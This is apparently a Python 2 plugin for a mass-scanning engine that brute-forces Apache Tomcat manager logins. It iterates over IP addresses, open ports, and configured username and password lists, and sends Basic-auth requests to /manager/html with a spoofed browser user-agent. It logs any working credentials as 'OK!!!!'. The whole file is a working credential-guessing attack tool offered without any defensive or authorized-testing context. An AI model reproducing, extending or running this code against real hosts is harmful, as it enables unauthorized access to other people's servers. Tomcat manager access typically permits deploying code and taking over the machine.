from task import *
import urllib2, httplib, base64

class tomcat_plugin(engine_plugin):
    def __init__(self, name):
        engine_plugin.__init__(self, name)
        
    def test_tomcat(self, host, port, user, pwd, is_https = False):
        auth = base64.b64encode('%s:%s' % (user, pwd)).replace('\n', '')
        try:
            if is_https:
                h = httplib.HTTPS(host, port)
            else:
                h = httplib.HTTP(host, port)
                
            h.putrequest('GET', '/manager/html')
            h.putheader('Host', host+':'+port)
            h.putheader('User-agent', "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0")
            h.putheader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
            h.putheader('Accept-Language','en-us')
            h.putheader('Accept-Encoding','gzip, deflate')
            h.putheader('Authorization', 'Basic %s' %auth)
            #print auth
            h.endheaders()

            statuscode, statusmessage, headers = h.getreply()

            if 'Coyote' in headers['Server']:
                if statuscode==200:
                    #print headers['Server']
                    #print "\t\n[OK]Username:", user,"Password:", pwd,"\n"
                    return headers
                return ''
        except :
            pass
        return None
    
    def handle_task(self, task_info):
        ip =  socket.inet_ntoa(struct.pack("I", socket.htonl(task_info['work'])))
        print "\r>>: %s" % ip,

        tomcat_pro = None
        for port in self.get_cfg_vaule(task_info, "ports").split(" "):
            try:
                sock = socket.create_connection((ip, port), 4)
                sock.close()

                for user in self.get_cfg_vaule(task_info, "users").split("\n"):
                    for pwd in self.get_cfg_vaule(task_info, "passes").split("\n"):
                        if tomcat_pro == 'http':
                            if self.test_tomcat(ip, port, user, pwd):
                                self.log(task_info, "http://%s:%s\t%s\t%s OK!!!!" % (ip, port, user, pwd))
                                return
                            continue
                        elif tomcat_pro == 'https':
                            if self.test_tomcat(ip, port, user, pwd, True):
                                self.log(task_info, "https://%s:%s\t%s\t%s OK!!!!" % (ip, port, user, pwd))
                                return
                            continue
                        
                        ret1 = self.test_tomcat(ip, port, user, pwd)
                        if ret1:
                            self.log(task_info, "http://%s:%s\t%s\t%s OK!!!!" % (ip, port, user, pwd))
                            return
                        
                        ret2 = self.test_tomcat(ip, port, user, pwd, True)
                        if ret2:
                            self.log(task_info, "https://%s:%s\t%s\t%s OK!!!!" % (ip, port, user, pwd))
                            return
                            
                        if ret1 == None and ret2 == None:
                            print "%s no tomcat found" % ip
                            return

                        if not tomcat_pro:
                            if ret1 != None:
                                tomcat_pro = 'http'
                            else:
                                tomcat_pro = 'https'
                            self.log(task_info, "%s tomcat open" % ip)
                            
            except:pass
        
def init_plugin(name):
    return tomcat_plugin(name)
